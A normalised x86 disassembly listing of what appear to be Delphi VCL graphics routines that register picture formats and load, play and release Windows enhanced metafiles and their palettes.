mov edx r-xdata
mov eax esi
call sub_41fd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc70
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
add esp 0xfffffff0
call sub_403668
sub_41fd0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41fd8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404e3c
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408024
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_4040e8
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_414210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd96
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_41fda0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_41fe27
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408024
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40412c
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_4143bc
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4044a0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe2e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_41fe38
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41feb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4143bc
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403294
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4042f8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4044a0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41febd
lea eax [ ebp - 0x8 ]
call sub_404094
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41fec8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420047
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404094
mov eax [ ebp + 0x8 ]
call sub_404094
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403570
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42004e
lea eax [ ebp - 0x3c ]
call sub_404094
lea eax [ ebp - 0x10 ]
call sub_404094
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_4090a8
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40435c
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_40435c
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_4090a8
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4090a8
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_408634
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_4040e8
sub_420114
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4201c0
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4201c0
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4201c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_420194
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403344
mov eax [ esi + 0x8 ]
call sub_403344
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4201c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_414210
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420204
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_414210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420228
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4143bc
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4143bc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4202a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
call sub_420264
call sub_420284
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4202e4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_420314
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40328c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414a98
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_420348
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4034d0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403344
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403558
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403558
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
sub_4203c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_420454
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403344
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40328c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420474
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420598
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408894
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4045f4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41fda0
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420537
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
mov eax [ ebx + 0xc ]
call sub_403344
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403558
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42059f
lea eax [ ebp - 0x14 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4205a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_420228
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42061f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_41e4f4
mov eax [ ebx + 0xc ]
call sub_403344
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403558
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42066c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_4206e0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4203c4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4203c4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4149b4
mov edx ebx
mov eax esi
call sub_4203c4
jmp r-xdata
pop esi
pop ebx
retn
sub_42073c
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_420760
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_420788
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42088f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4042f8
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41fe38
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403344
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420811
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420896
lea eax [ ebp - 0x48 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_420816
mov eax [ ebp - 0x4 ]
call sub_403344
call sub_403af8
call sub_403b4c
mov eax [ ebx + 0xc ]
call sub_403344
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420896
lea eax [ ebp - 0x48 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403558
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4208a0
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403294
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402c34
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_4208fc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_420978
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_420788
mov eax [ ebp - 0x8 ]
push eax
push sub_4208a0
push ebp
call sub_4208fc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4209f4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41c444
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_420a34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41f7ac
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_420a7c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421a54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_420aac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_421a54
mov edx esi
mov eax ebx
call sub_4149b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_421a50
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_420b40
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41e234
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41e234
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41e234
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41e234
push eax
call SelectPalette
sub_420bd8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420d80
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4062e4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4062e4
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_420c3c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c444
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_420cc8
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420d80
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4062e4
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4062e4
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_420d2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4212a8
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_416050
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_420ee4
mov edx esi
mov eax ebx
call sub_420e14
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_420d80
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_421a54
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_421a50
pop esi
pop ebx
retn
sub_420da8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4212a8
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_420ee4
mov edx esi
mov eax ebx
call sub_420e14
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_420e14
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420d80
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41627c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026f4
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420ed4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028f0
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41627c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e524
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
